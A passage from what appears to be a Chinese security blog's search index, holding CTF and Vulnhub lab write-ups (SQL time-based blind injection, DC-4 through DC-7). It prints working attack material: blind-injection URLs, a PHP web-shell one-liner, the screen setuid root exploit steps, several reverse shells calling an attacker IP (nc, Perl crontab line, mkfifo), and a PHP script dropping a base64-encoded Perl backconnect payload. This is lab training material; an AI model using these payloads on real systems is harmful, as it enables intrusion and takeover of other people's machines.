10的相关漏洞，对于漏洞有了一个大概的认识，接下来就是去多实际操作，去熟悉漏洞的相关特性，有助于您更好的了解这些漏洞。\n\n\n参考文章：  \n[OWASP Top 10 2017](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf)  \n[三分钟了解OWASP TOP 10 2017 RC2](https://www.freebuf.com/news/152207.html)  \n[浅谈OWASP TOP 10](https://www.cnblogs.com/cn-36/p/6723536.html)\n","tags":["漏洞描述"],"categories":["实用技巧"]},{"title":"SQL注入(时间盲注)","url":"/2019/10/04/CTF/墨者学院/SQL注人(时间盲注)/","content":"\n了解盲注语法，如何利用盲注获取数据\n\n<!-- more -->\n\n# 目标\n\n * 了解SQL时间盲注\n * 掌握SQL注入语法\n * 掌握SQL注入原理\n * 了解SQL注入常用注释字符\n >本题使用的工具\n \tsqlmap，hackbar\n >环境\n \t物理机：windows10\n \t虚拟机：kali\n # 时间盲注\n ## 1 判断是否存在盲注\n\n可以发现判断有多种方式，只要能保证sleep()执行，就可以根据回显的时间判断是否存在时间注入\n```url\n命令1 ：http:/ip/flag.php?type=1 and sleep(5) '\n命令2：http://ip/flag.php?type=1 and if(ascii(substr(database(),1,1))=114,1,sleep(5))'\n命令3：http://ip/flag.php?type=1 and if(1=0,1,sleep(10)) --\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190610234646882.png)\n\n发现存在明显的延迟，说明存在时间注入，这里我采取的做法是盲注，最后发现存在回显，也可以直接获取，就不多叙述了。\n\n## 2 获取数据库\n* 猜解数据库长度\n\t测试数据库的长度，当12时发生时间注入\n\t```url\n\thttp://ip/flag.php?type=1 and if(length(database())=12,sleep(5),1) --+\n\t```\n\t![在这里插入图片描述](https://img-blog.csdnimg.cn/20190610235206646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)\n\n* 猜解数据库名\n\t解释几个函数的用法\n\t1 `database()`： 获取数据库\n\t2 `substr()`：截取字符串函数\n\t用法：substr(string string,num start,num length);\n\tstring为字符串；\n\tstart为起始位置；\n\tlength为长度。\n\t3 `ascii()`：返回字符串str的最左面字符的ASCII代码值\n\t4 `if(语句1，语句2，语句3)` ：如果语句1正确执行语句2，否则执行语句3\n\n\t第一位 112 对应 p\n\t使用注入语句**if(ascii(substr(database(),1,1))**\n```URL\nhttp://ip/flag.php?type=1 and if(ascii(substr(database(),1,1))=112,sleep(5),1) --+\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190611000422360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)\t剩下的交给sqlmap去跑\n命令：`sqlmap -u url --dbs`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190611000446519.png)## 3 猜解表\n* 1 猜解表的长度\n\t这里都是猜解的最终flag的表和数据库\n\t发现在当长度为4 时发生延时\n\t```url\n\thttp://ip/flag.php?type=1 and if(length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=4,sleep(5),1) --\n\t```\n* 2 猜解表\n\t* 通过ascii去判断\n\t判断第一位是否是字母\n```\turl\n\thttp://219.153.49.228:40472/flag.php?type=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),1,1))>96,sleep(5),1) --\n```\n当前数据库的第三张表的第一个字符为f\n```url\n\thttp://ip/flag.php?type=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),1,1))>102,sleep(5),1) --\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190611001117514.png)\t*  使用left去猜解\n\t`left(str,length)` ：LEFT()函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。\n```url\nhttp://ip/flag.php?type=1 and if (left((select table_name from information_schema.tables where table_schema=database() limit 1,1),4)='flag',sleep(5),1)--+\n```\nsqlmap 跑出剩余的\n命令：`sqlmap -u url -D pentesterlab --tables`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190611001557667.png)## 4 获取字段值\n\n* 猜解长度\n\t猜解第二个字段值的长度\n```url\nhttp://ip/flag.php?type=1 and if(length((select column_name from information_schema.columns where table_name='flag' limit 1,1))=4,sleep(5),1)—\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190611001730951.png)\n* 猜解字段值\n\t第一个字段值的第3位 为i\n```url\nhttp://ip/flag.php?type=1 and if(ascii(substr((select column_name from information_schema.columns where table_name=0x666c6167 limit 0,1),1,1))=105,sleep(4),1) --\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190611001842476.png)\t第一个字段值的第2位 为d\n```url\nhttp:/ip/flag.php?type=1 and if(ascii(substr((select column_name from information_schema.columns where table_name=0x666c6167 limit 0,1),2,1))>99,sleep(4),1) --\n```\n所以第一个字段值为id\n* left\n\t利用left求第二个字段值\n\t第一个字符为f，直接猜测flag\n```url\n\thttp://ip/flag.php?type=1 and if(left((select column_name from information_schema.columns where table_name=0x666c6167 limit 1,1),1)='f',sleep(4),1) --\n\t成功延时\n\thttp://219.153.49.228:40472/flag.php?type=1 and if(left((select column_name from information_schema.columns where table_name=0x666c6167 limit 1,1),4)='flag',sleep(4),1)—\n```\n## 5 下载数据\n* 猜长度\n\t猜测第一个数据的长度为6\n```url\n\thttp://ip/flag.php?type=1 and if(length((select flag from flag limit 0,1))=6,sleep(4),1)--\n```\n\n* 猜数据\n\t第一位数据为m\n```url\n\thttp://ip/flag.php?type=1 and if(ascii(substr((select flag from flag limit 0,1),1))=109,sleep(4),1)--\n```\n\t直接猜测mozhe发现缺少一位，猜测最后一位\n```url\n\thttp://ip/flag.php?type=1 and if(ascii(substr((select flag from flag limit 0,1),6))=49,sleep(4),1)--\n```\n最后一位是1\n\n使用left验证\n\t成功延时，拿到flag去验证把\n```url\n\thttp://ip/flag.php?type=1 and if(left((select flag from flag limit 0,1),6)='mozhe1',sleep(4),1)--\n```\n 使用sqlmap验证\n 命令：`sqlmap -u url -D pentesterlab -T flag -C flag --dump`\n ![在这里插入图片描述](https://img-blog.csdnimg.cn/20190611002407450.png)\n # 总结\n 时间盲注特别耗时间，在做的过程中要仔细，还要注意每个函数的括号，避免由于少个括号一直错误。\n\n---\n永远不要停下学习的脚步\n","tags":["sql盲注"],"categories":["CTF"]},{"title":"Vulnhub 之 DC-6 靶机复现","url":"/2019/10/04/靶机/Vulnhub DC-6/","content":"\n掌握nmap，sudo 提权方式\n\n<!-- more -->\n\n[TOC]\n\n\n\n# Vulnhub 之 DC-6 靶机复现\n\n## 前言\n\n**本靶机仅供学习使用，请不要用于其他路径，作者不承担任何法律责任**\n\n\n\n终于打到dc的最后一个靶机了，花了几个月的闲暇时间来试试，越到后面靶机的难度就会越来越大。所以也参考了一个资料 ，善于使用搜索引擎对您的学习很有进步。\n\n\n\n## 靶机描述\n\n按例做一个描述，获取一些关于靶机的提示，这对你如何去拿下它有很大的帮助\n\n下载地址：[DC-6](http://www.five86.com/dc-4.html)\n\n```\n获取有用的信息，这可能是爆破的密码\ncat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt\n\n```\n\n## 复现环境\n\n```\nkali: 192.168.248.130\nDC-6: 192.168.248.145\n```\n\n## 过程\n\n* 获取ip和端口\n\n  ```\n  nmap -sn 网段\n  nmap -sS ip\n  ```\n\n  开启了22和80端口\n\n  \n\n* 这里访问会跳转到wordy，但是访问失败需要手动绑定。之前的环境也出现过相同的问题\n\n  打开发现是wordpress的cms ，使用wpscan扫描用户，这个在之前的DC-2也同样使用过\n\n  安装参考：https://www.freebuf.com/sectool/174663.html\n\n  ```\n  查找网站上所有的用户\n  wpscan --url http://wordy/ -e\n  这边使用的kali 可能会出现无法更新的情况，在请问大佬后给出了 apt-get upgrate 通过更新源去更新wpscan，这样也能达到同样的效果\n\n  ```\n  \n  \n  \n  成功获取到了5个用户\n  \n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805093436.png)\n  \n* 爆破\n\n  接下来就是爆破密码了，根据我们获得的提示，生成字典\n\n  `cat rockyou.txt | grep k01 > passwords.txt`\n\n  之后使用wpscan 去爆破 获取到一个用户名和密码：mark/helpdesk01s\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805102249.png)\n\n  后台地址：\n\n  http://wordy/wp-login.php\n\n* 全局查看 \n\n  没有发现有用的信息，查看插件发现存在 Activity monitor，搜索 发现存在远程命令执行的漏洞\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805103952.png)\n\n* 接下来就是使用它去\n\n  https://www.exploit-db.com/exploits/45274 这里给出一个脚本的链接\n\n  我们需要修改他里面的nc  就可以反弹shell\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805104847.png)\n\n  ​\t或者使用burp\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805110533.png)\n\n  都可以反弹到shell\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805110758.png)\n\n* 提权\n\n  在mark目录下发现stuff 得到用户，切换用户\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805111207.png)\n\n  发现sudo权限\n\n  尝试利用提权，这里可以修改拿到jens的权限\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805111859.png)\n\n  继续深入 发现用户存在nmap的权限\n\n  搜索 发现nmap提权方式 \n\n  通过root权限执行nmap 然后nmap 去执行脚本， 获取root权限\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805112828.png)\n\n  之后就是root 权限了， 接下来就是 看看flag\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190806094954.png)\n\n  ","tags":["提权"],"categories":["靶机"]},{"title":"DC-5 复现","url":"/2019/10/04/靶机/Vulnhub DC-5 /","content":"\n掌握利用各种root权限的环境提权\n\n<!-- more -->\n\n#  Vulnhub 之 DC-5 靶机复现\n\n\n\n## 前言\n\n本靶机只做学习使用，不要将其利用于非法途径。\n\n终于来到了倒数第二关，这一关将难度增加，所以我们需要借助搜索工具来帮助我们完成\n\n\n\n## 作者描述\n\n```\nDC-5是另一个专门建造的脆弱实验室，目的是获得渗透测试领域的经验。\n\n这个计划是为了让DC-5更上一层楼，所以这对初学者来说可能不太好，但对有中级或更好经验的人来说应该没问题。时间会证明一切(反馈也会证明)。\n\n据我所知，只有一个可利用的入口点可以进入(也没有SSH)。这个特定的入口点可能很难识别，但它就在那里。你需要寻找一些有点不寻常的东西(随着页面刷新而改变的东西)。这将有希望提供一些关于漏洞可能涉及到什么的想法。\n\n请注意，这里不涉及phpmailer漏洞。:-)\n\n这一挑战的最终目标是找到根，阅读唯一的旗帜。\n\n必须具备Linux技能和熟悉Linux命令行，就像一些基本渗透测试工具的经验一样。\n```\n\n## 复现环境\n\nkali： 192.168.248.130\n\nDC-5 : 192.168.248.142\n\n## 开始复现\n\n* 还是老套路扫网段，扫端口。拿到ip：192.168.248.142 开了两个端口：80和111\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723183828.png)\n\n\n\n* 目录遍历\n\n  访问这些网站，试图寻找新的东西\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723195951.png)\n\n* 查看网站\n\n  在concat.php 发现了输入栏\n\n  看到输入框就测测sql注入，xss\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723185409.png)\n\n  发现在url处返回了http://192.168.248.142/thankyou.php?firstname=1&lastname=1&country=other&subject=1\n\n* 文件包含\n\n  发现`foster 包含的copyright 20xx ` 是会变化的\n\n  php在底部调用了footer.php 可能存在本地文件包含，尝试file=xxx测试\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723201552.png)\n\n\n\n* 利用文件包含获取shell\n\n  由于网站会记录url日志，写一句话进去，访问获取shell\n\n  `<?php system($_GET['cmd']);?>`\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723205437.png)\n\n  访问日志，并执行nc命令，获取到shell\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723205339.png)\n\n* 借用提权工具\n\n  LinEnum.sh 获取到了提权操作\n\n  发现 guid 处存在可以文件\n\n  搜索发现提权思路\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723212545.png)\n\n  参考：https://www.exploit-db.com/exploits/41154\n\n  先编译后上传执行\n\n  ```xml\n  gcc -fPIC -shared -ldl -o libhax.so libhax.c\n  gcc -o rootshell rootshell.c\n  ```\n\n  通过wget上传\n\n  之后执行\n\n  ```\n  echo \"[+] Now we create our /etc/ld.so.preload file...\"\n  cd /etc\n  umask 000 # because\n  screen -D -m -L ld.so.preload echo -ne  \"\\x0a/tmp/libhax.so\" # newline needed\n  echo \"[+] Triggering...\"\n  screen -ls # screen itself is setuid, so...\n  /tmp/rootshell\n  ```\n\n\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723214526.png)\n\n## 查看flag\n\n在root目录下\n\n\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723223011.png)\n","tags":["suid提权","本地文件包含"],"categories":["靶机"]},{"title":"Vulnhub DC-4","url":"/2019/10/04/靶机/Vulnhub DC-4/","content":"\n熟悉提权步骤，和漏洞发现\n\n<!-- more -->\n\n\n\n\n\n# Vulnhub 之 DC-4\n\n## 前言\n\nDC已经做了一半了，前三次都是基于初学者的，这次的难度就提升了，适合初学者和入\n\n\n\n门的伙伴。\n\n还是按照常例看看作者是怎么描述的吧。\n\n## 下载地址\n\n[DC-4]:(http://www.five86.com/dc-4.html)\n\n\n\n## 描述\n\n```xml\n\nDC-4是另一个专门建造的脆弱实验室，目的是获得渗透测试领域的经验。\n\n与以前的DC版本不同，这个版本主要是为初学者/中间用户设计的。只有一面旗帜，但技术上来说，有多个入口，就像上次一样，没有线索。\n\n必须具备Linux技能和熟悉Linux命令行，就像一些基本渗透测试工具的经验一样。\n\n对于初学者来说，谷歌可能会有很大的帮助，但是你可以随时在@DCAU7发推给我寻求帮助，让你重新开始。但是请注意:我不会给你答案，相反，我会给你一个如何前进的想法。\n```\n\n\n\n所以说，谷歌真的很万能。O(∩_∩)O哈哈~_\n\n\n## 靶机环境\n\n记得修改DC-4的网络为NAT模式\n\n```html\nkali : 192.168.248.130\n\nDC-4 : 192.168.248.128\n```\n\n## 靶机复现\n\n* 扫描网段\n\n  `nmap -sn 192.168.248.0/24`\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721142149.png)\n\n  发现目标ip ： 192.168.248.128\n\n* 扫描端口\n\n  `nmap -sS 192.168.248.128`\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721143438.png)\n\n* 尝试爆破ssh\n\n  `hydra  -l root -P /root/Desktop/weakpass.txt -t 5 ssh://192.168.248.128`\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721144835.png)\n\n  一般破解需要时间所以我就做一个演示\n\n* 网站搜寻线索\n\n  发现是一个登录框，\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721145420.png)\n\n  并且没有登录限制，尝试爆破\n\n  可以使用hydra爆破，这里我使用burp做测试\n\n  设置为`Cluster bomb`,用户给admin和root ，密码采用弱口令字典这个网上挺多的，或者使用hydra的默认字典也可以，然后线程跑高点 ， 我这里给burp设置的20，大概不到一分钟就出来了。\n\n\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721151611.png)\n\n  这里只要登录成功后之后的登录都是636了\n\n* 登录发现\n\n  有三个命令可以运行，然后抓包查看发现可以在radio这块执行了系统命令，那么是否可以执行其他的命令\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721161839.png)\n\n  尝试执行`whoami`\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721162107.png)\n\n  既然可以执行一些简单的命令，我们就可以尝试去反弹shell\n\n  命令：`nc -e /bin/sh 192.168.248.130 4444`\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721162638.png)\n\n  获取交互模式\n\n  命令：`python -c 'import pty;pty.spawn(\"/bin/bash\")'`\n\n  之后在home的jim目录下发现了一个旧密码的备份\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721163345.png)\n\n  或许可以尝试用它去爆破ssh\n\n  命令：`chydra  -L /root/Desktop/user.txt -P /root/Desktop/dc_pass.txt -t 5 ssh://192.168.248.128`\n\n  等待是漫长的，要有耐心\n\n  终于出来了一个  用户名：`jim` 密码：`jibril04`\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721172645.png)\n\n  切换到jim用户下，打开mbox查看\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721165049.png)\n\n  有邮件，去mail下查看，发现了jim文件获取到jim的密码\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721165234.png)\n\n* 登录charles\n\n  密码： `^xHhA&hvim0y`\n\n  命令：`sudo -l `查看权限 发现可以不需要密码执行teehee\n\n  百度得到提权方式\n\n  1 通过teehee的sudo提升权限以 root身份写入crontab计划任务通过执行获取root权限\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721171456.png)\n\n  2 还有个2呢，多个想法多个活路\n\n  通过添加用户到passwd，设置其权限，之后su 访问即可获得root\n\n  ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721171755.png)\n\n  所以，最好不要给用户sudo权限，或者限制sudo权限的，这样才能保证网络安全\n\n## 结束语\n\n今天的靶机奉上各位看官，过程简单，主要掌握提权的思路和前期爆破的等待。\n","tags":["远程命令执行"],"categories":["靶机"]},{"title":"Vulnhub DC-7","url":"/2019/10/04/靶机/Vulnhub-DC-7/","content":"\n\n\n# Vulnhub 之 DC-7\n\n## 前言\n\n听朋友说dc出了7和8 ，下载尝试做一做，看能否通关\n\n## 下载地址\n\n[dc-7](http://www.five86.com/dc-7.html)\n\n## 描述\n\n> 读了下作者写的描述，基本对dc-7有个简单的认识，不需要爆破，而且要跳出惯性思维，掌握基本的linux语法和工具对于如何获取root有很大的帮助\n\n## 开始挑战\n\n### 环境\n\n> kali : 192.168.64.133\n>\n> 靶机：192.168.64.150\n\n### 获取基本信息\n\n通过nmap 扫描发现主机`192.168.64.150` ，他开放了两个端口`22`,`80`，所以出发点就确定了。\n\n查看web页面，熟悉的界面，和dc-1 是一个cms，记得上次是直接poc打进去的，之后修改数据库密码，拿到了后台。\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191009152745.png)\n\n虽然这次肯定打不进去了，但是试试，都是一种方法。果然没进去\n\n**扫扫目录看看**，啥都没扫到，好难过，看来连字典都不用用了\n\n**使用droopscan 扫描查看信息**\n\n版本可以用来查找相对应的漏洞\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191010094123.png)\n\n\n\n对比了下1和7的区别，多了个`@DC7USER`，看着没用，扔进google 看看，果然有点用\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191009163046.png)\n\n下载下来看看，如果能找到数据库的配置文件，那么就有可能通过其他做法拿到权限。\n\n获取到第一个信息点，`用户名：dc7user`,`password:MdR3xOgB7#dW`\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191009163502.png)\n\n查看了下文件，获取到了3个用户\n\n```\n'Mary', 'Moe', 'CEO', '46478415155456', 'mary@example.com'\n'Julie', 'Dooley', 'Human Resources', '46457131654', 'julie@example.com'\n'John', 'Doe', '048547896425', 'john@example.com'\n```\n\n尝试弱口令，限制了次数\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191009165144.png)\n\n之后想想怎么做，前面获取了一个账号和密码，尝试登录ssh看看，登录成功\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191009172431.png)\n\n这里就验证了之前的猜想，我们登录数据库，获取用户名和密码，\n\n查看一下当前能获取的信息，`ls -la`，`whoami`，`cat /etc/passwd`，居然可以看passwd\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191009202403.png)\n\n查看当前目录下的文件，看起来是像是日志之类的，发现应该是计划任务，每十五分钟一次，\n\n这里就有想法了，通过写入计划任务，反弹shell，获取root权限，因为计划任务是root用户执行的。但是当前账户权限较小。\n\n![1570624306516](E:\\靶机学习\\vulhub-dc\\dc-7\\2019-10-4-Vulnhub-DC-4-#-这是标题.assets\\1570624306516.png)\n\n查看计划任务执行的命令，发现`gpg`不知道是什么，查询一下，好像是用来加密数据的.\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191009205706.png)\n\n```\nGnupg symmetric encryption\nInstead, only a symmetric cipher is used to encrypt the document. The key used to drive the symmetric cipher is derived from a passphrase supplied when the document is encrypted, and for good security, it should not be the same passphrase that you use to protect your private key.\n```\n\n另一个命令在`/opt/scripts/backups.sh`下看到的，有个`drush`命令，百度一下看看\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570624306516.png)\n\n这里的`drush sql-dump` 命令，对数据库做一次导出\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191009211416.png)\n\n这里找到一条新的命令，可以执行sql命令\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191009211615.png)\n\n查看一下drush可以使用的命令\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191009212249.png)\n\n发现 `user-password` 可以修改用户名的密码，所以这里应该是关键了吧，修改成功，赶紧登录看看\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191009212249.png)\n\n这里有点尴尬， 之前尝试登录5次被锁定了，无耻一点，删除靶机重新打开，避免。\n\n百度到了方法，所以我们需要进去数据库，清空flood的数据再次登录，这里有个问题如何登录数据库，看看drush可以不\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191009213227.png)\n\n百度很给力的，居然有drush修改方式，我们照着修改\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191009213337.png)\n\n执行完后，登录失败，搜一下问题出那块了\n\n**这几条命令必须在/var/www/html下执行**\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191009220936.png)\n\n终于迈出了新的一步，登录成功\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191009221502.png)\n\n之后如果对这个cms不熟悉，可以直接百度 drupal 后台getshell,可以获取方法，找到一个远程命令执行漏洞https://xz.aliyun.com/t/2312\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191009225103.png)\n\n找到drupal的版本：8.7.6\n\n**搜索相关漏洞**\n\n失败的不提了，找到一个ctf的题中有关于drupal的相关提权[粗心的佳佳](https://www.cnblogs.com/iamstudy/articles/pwnhub_jiajia_writeup.html)\n\n**尝试利用主题上传getshell**\n\n这里需要打开update manager 由于我们有admin账户，所以这里打开没有难度，在list处搜索update ，即可安装成功\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191010101540.png)\n\n之后尝试上传一个zip文件，文件包含shell,失败，好像不能直接上传，我们去下载一个主题试试\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191010101921.png)\n\n找到另一个getshell文章[sevenlayers](https://www.sevenlayers.com/index.php/257-drupal-8-to-reverse-shell)\n\n下载codefilter 修改codefilter.module文件，上传失败\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191010110213.png)\n\n查找一下问题，作者的codefilter中有.info.yml 而我下载的没有，重新下载其他的modules \n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191010111153.png)\n\n成功上传\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191010111635.png)\n\n之后点击`enable newly added modules`安装token ，反弹shell ，结果 失败，查询发现需要启用`php filter`\n\n这里也失败了，找到了作者使用的`code filter`也没有执行成功，\n\n那么需要下载php filter 这样去执行php的shell 命令，官方移除了这个模块，并添加到php下[https://www.drupal.org/project/php](https://www.drupal.org/project/php),安装和前面一样\n\n之后在content下可以直接执行php代码\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191010113535.png)\n\n写入php反弹shell命令，执行失败，作者提示到这里需要先修改为phpcode，然后在输入php命令，这个来源于作者的另一个文章，这里提示到需要修改为phpcode ，不然 执行的时候会带着`<p><p>` \n\n重新执行一下反弹shell语句,附上php反弹shell脚本,修改其中的ip和port为自己的\n\n```\n<?php\nfunction which($pr) {\n$path = execute(\"which $pr\");\nreturn ($path ? $path : $pr);\n}\nfunction execute($cfe) {\n$res = '';\nif ($cfe) {\nif(function_exists('exec')) {\n@exec($cfe,$res);\n$res = join(\"\\n\",$res);\n} elseif(function_exists('shell_exec')) {\n$res = @shell_exec($cfe);\n} elseif(function_exists('system')) {\n@ob_start();\n@system($cfe);\n$res = @ob_get_contents();\n@ob_end_clean();\n} elseif(function_exists('passthru')) {\n@ob_start();\n@passthru($cfe);\n$res = @ob_get_contents();\n@ob_end_clean();\n} elseif(@is_resource($f = @popen($cfe,\"r\"))) {\n$res = '';\nwhile(!@feof($f)) {\n$res .= @fread($f,1024);\n}\n@pclose($f);\n}\n}\nreturn $res;\n}\nfunction cf($fname,$text){\nif($fp=@fopen($fname,'w')) {\n@fputs($fp,@base64_decode($text));\n@fclose($fp);\n}\n}\n$yourip = \"your IP\";\n$yourport = 'your port';\n$usedb = array('perl'=>'perl','c'=>'c');\n$back_connect=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj\".\n\"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR\".\n\"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT\".\n\"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI\".\n\"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi\".\n\"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl\".\n\"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==\";\ncf('/tmp/.bc',$back_connect);\n$res = execute(which('perl').\" /tmp/.bc $yourip $yourport &\");\n?> \n```\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191010115525.png)\n\n之后就简单了，我们修改之前的定时任务即可反弹提权到root，\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191010120116.png)\n\n```\n*/1 * * * * perl -e 'use Socket;$i=\"192.168.64.133\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n```\n\n由于不明原因，dc-7虚拟机卡死， 之后重新修改后，ip为`192.168.64.151`\n\n**提权**\n\n参考[linux下反弹shell](https://www.jb51.net/article/118423.htm)\n\n通过bash版本反弹\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191010125748.png)\n\n\n\n通过nc 反弹shell，测试发现nc没有-e选项\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191010124156.png)\n\n搜索nc反弹shell找到如下命令\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191010123706.png)\n\n把这个写入计划任务`opt/scripts/backups.sh`中\n\n\n\n```\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.64.133 4444 >/tmp/f\n\n```\n\n等待时间15分钟以内\n\n成功反弹\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1570683652577.png)\n\n\n\n \n\n","tags":["drupal提权"],"categories":["靶机"]},{"title":"Vulnhub之DC-3 joomla注入和ubutnu16.04 提权","url":"/2019/10/04/靶机/Vulnhub DC-3/","content":"\n常见cms漏洞 和系统版本提权\n\n<!-- more -->\n\n# Vulnhub靶机之DC-3\n\n## 前言  \n\n\n\n>  刚考完试，然而不能放弃对技术的热爱，又重新拾起了dc准备把他们6个做完  \n>\n>  今天介绍的是dc-3 